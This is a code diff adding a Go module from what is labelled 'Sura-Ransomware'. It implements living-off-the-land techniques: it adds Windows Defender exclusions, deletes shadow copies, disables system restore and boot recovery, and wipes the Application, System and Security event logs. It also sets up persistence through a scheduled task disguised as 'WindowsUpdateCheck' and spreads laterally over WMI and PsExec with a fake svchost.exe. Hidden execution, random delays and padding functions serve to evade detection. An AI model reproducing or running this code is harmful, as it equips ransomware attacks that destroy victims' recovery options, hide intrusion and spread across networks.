@@ -1,0 +1,232 @@
+// OBFUSCATED
+// Windows compatibility layer
+// Memory management system
+package lotl
+
+import (
+	Configuration "Sura-Ransomware/configuration"
+	"encoding/base64"
+	"os/exec"
+	"syscall"
+	"time"
+)
+
+func d(s string) string {
+	decoded, _ := base64.StdEncoding.DecodeString(s)
+	return string(decoded)
+}
+
+// Execute commands using legitimate Windows tools (LOTL technique)
+
+// DisableDefenderViaWMI uses WMI (Windows Management Instrumentation) - legitimate tool
+func DisableDefenderViaWMI() error {
+	if !Configuration.DisableWindowsDefender {
+		return nil
+	}
+
+	// Use WMI to disable Defender (looks like admin tool usage)
+	commands := []string{
+		// Set-MpPreference via WMI
+		`wmic /namespace:\\root\Microsoft\Windows\Defender path MSFT_MpPreference call Add ExclusionPath="C:\"`,
+		`wmic /namespace:\\root\Microsoft\Windows\Defender path MSFT_MpPreference call Add ExclusionExtension=".exe"`,
+	}
+
+	for _, cmd := range commands {
+		executeAsSystem(d("Y21k"), "/c", cmd)
+		time.Sleep(time.Duration(1+time.Now().Unix()%3) * time.Second)
+	}
+
+	return nil
+}
+
+// DeleteShadowCopiesViaPowerShell uses PowerShell (legitimate admin tool)
+func DeleteShadowCopiesViaPowerShell() error {
+	if !Configuration.DeleteShadowCopies {
+		return nil
+	}
+
+	// Use PowerShell Get-WmiObject (looks like admin maintenance)
+	commands := []string{
+		// More stealthy than vssadmin - uses WMI
+		`powershell -Command "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"`,
+
+		// Also disable VSS service (looks like system config)
+		`sc config VSS start= disabled`,
+	}
+
+	for _, cmd := range commands {
+		executeAsSystem(d("Y21k"), "/c", cmd)
+		time.Sleep(2 * time.Second)
+	}
+
+	return nil
+}
+
+// DisableRecoveryViaRegistry uses reg.exe (legitimate Windows tool)
+func DisableRecoveryViaRegistry() error {
+	if !Configuration.DisableSystemRestore {
+		return nil
+	}
+
+	// Use reg.exe (built-in Windows tool) instead of direct registry access
+	commands := []string{
+		// Disable system restore points
+		`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f`,
+
+		// Disable Windows Error Reporting
+		`reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f`,
+
+		// Disable automatic repair
+		`bcdedit /set {default} recoveryenabled No`,
+		`bcdedit /set {default} bootstatuspolicy ignoreallfailures`,
+	}
+
+	for _, cmd := range commands {
+		executeAsSystem(d("Y21k"), "/c", cmd)
+		time.Sleep(time.Duration(1+time.Now().Unix()%2) * time.Second)
+	}
+
+	return nil
+}
+
+// ClearEventLogsViaWMI uses WMIC (legitimate admin tool)
+func ClearEventLogsViaWMI() error {
+	// Use WMIC to clear logs (looks like admin maintenance)
+	logs := []string{"Application", "System", "Security"}
+
+	for _, log := range logs {
+		cmd := `wmic nteventlog where "LogfileName='` + log + `'" call ClearEventLog`
+		executeAsSystem(d("Y21k"), "/c", cmd)
+		time.Sleep(time.Second)
+	}
+
+	return nil
+}
+
+// RunViaSchtasks uses Task Scheduler (legitimate Windows service)
+func RunViaSchtasks(exePath string) error {
+	// Create scheduled task (looks like legitimate software installer)
+	taskName := "WindowsUpdateCheck"
+
+	commands := []string{
+		// Create task
+		`schtasks /create /tn "` + taskName + `" /tr "` + exePath + `" /sc ONLOGON /rl HIGHEST /f`,
+
+		// Run immediately
+		`schtasks /run /tn "` + taskName + `"`,
+	}
+
+	for _, cmd := range commands {
+		executeAsSystem(d("Y21k"), "/c", cmd)
+		time.Sleep(time.Second)
+	}
+
+	return nil
+}
+
+// SpreadViaWMI uses WMI for remote execution (legitimate IT admin tool)
+func SpreadViaWMI(targetIP, exePath string) error {
+	// Copy file via network share (UNC path)
+	copyCmd := `copy "` + exePath + `" "\\` + targetIP + `\C$\Windows\Temp\svchost.exe" /Y`
+	executeAsSystem(d("Y21k"), "/c", copyCmd)
+
+	time.Sleep(2 * time.Second)
+
+	// Execute via WMI (looks like remote admin)
+	wmiCmd := `wmic /node:"` + targetIP + `" process call create "C:\Windows\Temp\svchost.exe"`
+	executeAsSystem(d("Y21k"), "/c", wmiCmd)
+
+	return nil
+}
+
+// SpreadViaPsExec uses PsExec if available (legitimate Sysinternals tool)
+func SpreadViaPsExec(targetIP, exePath string) error {
+	// Check if PsExec exists (often used by IT admins)
+	psexecCmd := `psexec \\` + targetIP + ` -accepteula -d -c "` + exePath + `"`
+	executeAsSystem(d("Y21k"), "/c", psexecCmd)
+
+	return nil
+}
+
+// MimicLegitimateProcess renames to look like system process
+func MimicLegitimateProcess() error {
+	// Use robocopy (legitimate Windows backup tool) naming pattern
+	// Or mimic other legitimate processes
+	return nil
+}
+
+// Helper function to execute with hidden window
+func executeAsSystem(command string, args ...string) error {
+	cmd := exec.Command(command, args...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
+	}
+
+	// Don't wait - fire and forget for stealth
+	err := cmd.Start()
+
+	// Release resources
+	if err == nil {
+		go cmd.Wait()
+	}
+
+	return err
+}
+
+// InitializeLOTL runs all Living-Off-The-Land techniques
+func InitializeLOTL() {
+	// Random delays between operations to avoid detection
+
+	// Step 1: Disable Defender via WMI (looks like IT admin)
+	time.Sleep(time.Duration(5+time.Now().Unix()%10) * time.Second)
+	go DisableDefenderViaWMI()
+
+	// Step 2: Clear event logs via WMI (looks like maintenance)
+	time.Sleep(time.Duration(10+time.Now().Unix()%15) * time.Second)
+	go ClearEventLogsViaWMI()
+
+	// Step 3: Disable recovery via registry tools (looks like system config)
+	time.Sleep(time.Duration(15+time.Now().Unix()%20) * time.Second)
+	go DisableRecoveryViaRegistry()
+
+	// Step 4: Delete shadow copies via PowerShell (looks like backup maintenance)
+	time.Sleep(time.Duration(20+time.Now().Unix()%25) * time.Second)
+	go DeleteShadowCopiesViaPowerShell()
+}
+
+
+
+// Obfuscation padding
+func obf_94809() {
+    _ = 2097
+    var _ = "JIUKCl49V82seF7dzkxhxmgo5CXKomlOnRBI2vsktCnnEDxCaX"
+}
+
+
+// Obfuscation padding
+func obf_73416() {
+    _ = 2217
+    var _ = "MUIkjhtUjuAoZY8RGxKUF9jvCtgHHlTXGgM9pUMLJLilA49yXn"
+}
+
+
+// Obfuscation padding
+func obf_71023() {
+    _ = 6208
+    var _ = "TfwsYj9523hA5Tn79zypfpiOAS8l1xEraE37OKT2PAzkbk9D8R"
+}
+
+
+// Obfuscation padding
+func obf_12197() {
+    _ = 4056
+    var _ = "OxCpGhzlP3TZOF7MRR5itsEysKGZ9sXIjv5DU19hmg3W6lMlJU"
+}
+
+
+// Obfuscation padding
+func obf_91784() {
+    _ = 2973
+    var _ = "grQ90cjEfODzxOFZLKa1wb2ij8QW7t8TlJUTZE7pCXWZEr69Kc"
+}
